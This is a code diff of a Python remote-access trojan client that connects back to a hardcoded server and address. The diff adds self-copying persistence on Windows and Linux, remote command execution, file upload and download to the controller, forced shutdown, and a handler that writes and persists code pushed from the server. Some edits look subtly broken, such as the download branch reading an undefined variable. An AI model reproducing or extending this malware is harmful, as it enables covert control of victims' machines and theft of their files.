@@ -1,3 +1,19 @@
+global encrypted
+global decrypted
+encrypted = list(
+    r"""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
+decrypted = list(
+    r"""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
+
+
+def encrypt(string):
+    return string
+
+
+def decrypt(string):
+    return string
+
+
 try:
     import os
     import socket
@@ -14,10 +30,12 @@ persistence_status = "Enabled" if "AppData" in os.getcwd() or "/etc/rc.local" in
 global compiled_name
 
 ##### VARIABLES #####
-compiled = False if "{cb5185196ad3147d58c13c22b2a32292}" == "False" else True ##### Var
-compiled_name = "{8f8c6b7b02405c7ab1027019e69a81e1}" ##### Var
-server = "{cf1e8c14e54505f60aa10ceb8d5d8ab3}" ##### Var
-port = int("{901555fb06e346cb065ceb9808dcfc25}")  #### Var
+compiled = False if "False" == "False" else True  ##### Var
+compiled_name = ".py"  ##### Var
+server = "192.168.1.103"  ##### Var
+port = int("23125")  #### Var
+
+
 ##### VARIABLES #####
 
 ########## PERSISTENCE/START OF PRIVILLEGE ESCALATION ##########
@@ -85,26 +103,27 @@ def persistence(file="self"):
             file_name = os.path.basename(__file__)
         elif compiled:
             file_name = compiled_name
-    else:
-        file_name = file
-    global current_os
-    current_os = "windows" if os.popen("ls").read() == "" else "linux"
-    if current_os == "windows":
-        os.popen('copy "{}" "%appdata%\\Microsoft\\{}"'.format(file_name, file_name)).read()
-        if persistence_windows_1(file_name):
-            persistence_status = "Enabled"
         else:
-            persistence_status = "Disabled (Permission Error)"
-    elif current_os == "linux":
-        os.popen('cp "{}" "{}/.{}"'.format(file_name, os.path.expanduser("~"), file_name))
-        if persistence_linux_1(file_name):
-            send_buffer("Enabled")
-        else:
-            send_buffer("Disabled (Permission Error)")
-            if persistence_linux_2(file_name):
+            file_name = file
+        global current_os
+        current_os = "windows" if os.popen("ls").read() == "" else "linux"
+        if current_os == "windows":
+            os.popen('copy "{}" "%appdata%\\Microsoft\\{}"'.format(file_name, file_name)).read()
+            if persistence_windows_1(file_name):
+                persistence_status = "Enabled"
+            else:
+                persistence_status = "Disabled (Permission Error)"
+        elif current_os == "linux":
+            os.popen('cp "{}" "{}/.{}"'.format(file_name, os.path.expanduser("~"), file_name))
+            if persistence_linux_1(file_name):
                 send_buffer("Enabled")
             else:
                 send_buffer("Disabled (Permission Error)")
+                if persistence_linux_2(file_name):
+                    send_buffer("Enabled")
+                else:
+                    send_buffer("Disabled (Permission Error)")
+
 
 persistence()
 
@@ -113,8 +132,10 @@ while True:
         def recive(buffer):
             return decrypt(server_connection.recv(buffer).decode("utf-8"))
 
+
         def send(str):
             server_connection.send(encrypt(str).encode("utf-8"))
+
 
         def recive_buffer(buffer):
             bff = recive(buffer)
@@ -124,6 +145,7 @@ while True:
                 while condition_msg:
                     msg = recive(buff)
                     condition_msg = False
+                print(msg)
                 return msg
 
 
@@ -136,29 +158,6 @@ while True:
             except:
                 pass
 
-        def recive_file(buffer):
-            while True:
-                bff = server_connection.recv(buffer).decode("utf-8")
-                break
-            if bff.startswith("#"):
-                buff = int(bff.split("#", 2)[1])
-                name = bff.split("#", 2)[2]
-                while True:
-                    file = server_connection.recv(buff)
-                    break
-                f = open(name, "wb")
-                f.write(file)
-                return name
-
-
-        def send_file(file):
-            name = file.split("/")[-1]
-            with open(file, "rb") as f:
-                file = f.read()
-                buffer = str(len(file.decode("latin")))
-                server_connection.send("#{0}#{1}".format(buffer, name).encode("utf-8"))
-                time.sleep(0.1)
-                server_connection.send(file)
 
         ########### SERVER CONNECTION START ##########
 
@@ -197,17 +196,13 @@ while True:
         condition = True
         while condition:
             request = recive_buffer(1024)
-            print(request.split("}", 1)[1])
             ##### PERCISTECNE COMMAND #####
             if request.startswith("{persistence}"):
-                if request.split("}", 1)[1] == "-s":
+                if request.split("-")[1] == "s":
                     send_buffer(persistence_status)
-                elif request.split("}", 1)[1] == "-r":
+                elif request.split("-")[1] == "r":
                     persistence()
-                    send_buffer(persistence_status)
-                else:
-                    persistence(file=request.split("}", 1)[1])
-                    send_buffer(persistence_status)
+                    send_buffer("Result: Persistence " + persistence_status)
             ##### CHDIR COMMAND #####
             elif request.startswith("{chdir}"):
                 dir = request.split("}", 1)[1]
@@ -216,7 +211,14 @@ while True:
                     send_buffer("{sucess}" + get_dir())
                 except FileNotFoundError:
                     send_buffer("{error}Invalid dir")
-
+            ##### CODE UPDATE COMMAND #####
+            elif request.startswith("{codeupdate"):
+                extension = "." + request.split("}", 1)[0].split(" ", 1)[1]
+                with open(".update" + extension, "w") as file:
+                    file.write(request.split("}", 1)[1])
+                persistence(".update" + extension)
+                os.remove(".update" + extension) if persistence_status == "Enabled" else send_buffer(
+                    "Failed to enable persistence on update")
             ##### COMMAND CHECK #####
             elif request.startswith("{command}"):
                 command = request.split("}", 1)[1]
@@ -259,11 +261,18 @@ while True:
                     send_buffer("{error}")
 
             elif request.startswith("{upload"):
-                recive_file(1024)
+                file_name = request.split("}", 1)[0].split(" ", 1)[1]
+                file_code = request.split("}", 1)[1]
+                with open(file_name, "w", encoding="utf-8") as file:
+                    file.write(file_code)
 
             elif request.startswith("{download}"):
-                file_path = request.split("}", 1)[1]
-                send_file(file_path)
+                file_name = command.split("}", 1)
+                try:
+                    with open(file_name, encoding="utf-8") as file:
+                        send_buffer("{sucess}" + file.read())
+                except:
+                    send_buffer("{error}")
 
             elif request.startswith("{shutdown}"):
                 os.system("shutdown /s /f /t 1") if current_os == "windows" else os.system("shutdown")
